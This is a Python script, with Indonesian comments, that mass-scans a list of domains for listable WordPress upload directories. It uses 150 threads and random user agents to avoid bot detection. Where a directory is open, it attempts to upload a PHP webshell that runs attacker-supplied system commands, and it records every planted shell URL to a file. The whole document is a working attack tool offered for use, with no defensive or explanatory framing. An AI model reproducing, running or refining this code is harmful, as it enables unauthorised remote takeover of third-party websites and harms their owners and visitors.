import requests
import json
import os
import concurrent.futures
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import random

# Inisialisasi warna
init()
GREEN = Fore.GREEN
RED = Fore.RED
WHITE = Fore.WHITE
RESET = Style.RESET_ALL

# Konfigurasi utama
TIMEOUT = 6  # Timeout lebih panjang agar tidak terlalu cepat gagal
MAX_THREADS = 150  # Thread lebih banyak untuk scanning lebih cepat
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/99.0",
]

requests.packages.urllib3.disable_warnings()

def random_user_agent():
    """Mengembalikan user-agent secara acak untuk menghindari deteksi bot."""
    return {"User-Agent": random.choice(USER_AGENTS)}

def load_file(file_path):
    """Membaca daftar domain atau eksploitasi dari file."""
    if not os.path.exists(file_path):
        print(f"{RED}Error: {file_path} tidak ditemukan.{RESET}")
        return []
    with open(file_path, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines() if line.strip()]

def check_upload_directory(domain):
    """Mengecek apakah wp-content/uploads bisa diakses."""
    url = f"{domain}/wp-content/uploads/"
    try:
        response = requests.get(url, headers=random_user_agent(), timeout=TIMEOUT, verify=False)
        if response.status_code == 200 and "Index of" in response.text:
            print(f"{GREEN}Direktori upload terbuka di {url}{RESET}")
            return True
    except requests.RequestException:
        pass
    return False

def upload_webshell(domain):
    """Mencoba mengunggah webshell ke direktori uploads jika terbuka."""
    shell_content = "<?php system($_GET['cmd']); ?>"
    files = {"file": ("shell.php", shell_content, "application/x-php")}
    upload_url = f"{domain}/wp-content/uploads/"
    try:
        response = requests.post(upload_url, files=files, headers=random_user_agent(), timeout=TIMEOUT, verify=False)
        if response.status_code in [200, 201]:
            shell_url = f"{upload_url}shell.php"
            print(f"{GREEN}Webshell berhasil diunggah: {shell_url}{RESET}")
            with open("shell.txt", "a", encoding="utf-8") as file:
                file.write(shell_url + "\n")
            return shell_url
    except requests.RequestException:
        pass
    return None

def scan_domain(domain):
    """Melakukan scanning pada satu domain."""
    print(f"{WHITE}Scanning {domain}...{RESET}")
    
    if check_upload_directory(domain):
        uploaded_shell = upload_webshell(domain)
        if uploaded_shell:
            print(f"{GREEN}Webshell dapat diakses di {uploaded_shell}{RESET}")

def main():
    """Fungsi utama untuk menjalankan scanning."""
    domains_file = input("Masukkan daftar domain: ").strip()
    result_file = "shell.txt"

    # Hapus file lama
    open(result_file, 'w').close()

    domains = load_file(domains_file)
    if not domains:
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(scan_domain, domain) for domain in domains]
        concurrent.futures.wait(futures)

    print(f"{GREEN}Scanning selesai. Hasil tersimpan di {result_file}{RESET}")

if __name__ == '__main__':
    main()